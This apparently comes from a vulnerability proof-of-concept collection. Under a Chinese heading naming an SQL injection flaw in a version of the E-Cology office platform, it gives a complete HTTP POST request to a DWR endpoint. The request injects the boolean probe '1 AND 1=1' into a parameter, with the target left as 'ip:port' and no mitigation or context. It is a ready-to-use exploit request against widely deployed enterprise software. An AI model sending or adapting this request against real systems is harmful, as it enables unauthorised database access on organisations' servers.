## 某微 E-Cology 某版本 SQL注入漏洞
```
POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
Host: ip:port 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Connection: close
Content-Length: 189
Content-Type: text/plain
Accept-Encoding: gzip

callCount=1
page=
httpSessionId=
scriptSessionId=
c0-scriptName=DocDwrUtil
c0-methodName=ifNewsCheckOutByCurrentUser
c0-id=0
c0-param0=string:1 AND 1=1
c0-param1=string:1
batchId=0

```
